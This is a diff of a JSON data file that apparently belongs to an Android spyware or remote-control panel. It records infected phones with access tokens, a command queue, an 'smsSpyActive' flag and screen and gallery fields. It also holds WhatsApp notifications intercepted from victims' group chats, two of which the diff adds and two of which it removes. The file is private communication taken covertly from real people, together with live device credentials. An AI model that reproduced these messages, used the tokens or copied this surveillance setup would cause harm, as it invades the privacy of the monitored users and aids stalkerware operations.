@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775044644736,
+    "lastSeen": 1775044647712,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13222 pesan): ~ Bot",
+        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
+        "time": "01/04 19:57",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044649176
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15484 pesan dari 10 chat",
+        "time": "01/04 19:57",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044647612
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13221 pesan): ~ r",
@@ -4003,22 +4019,6 @@
         "time": "01/04 19:49",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044150477
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13057 pesan): ~ Dapa",
-        "content": "Ratu kecantikan anak makan roti bakar",
-        "time": "01/04 19:49",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044150333
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Pegasus-X Room (4 pesan): ~ Call Me Zal7Sex",
-        "content": "🔗 TikTok · — Zal Infinity | penuhkan komen #Zal7Sex kalo mau apk ga maintenance😈\n\nlink video\nhttps://vt.tiktok.com/ZSHjYWLJT",
-        "time": "01/04 19:49",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044146181
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775044646198,
+    "lastSeen": 1775044649173,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
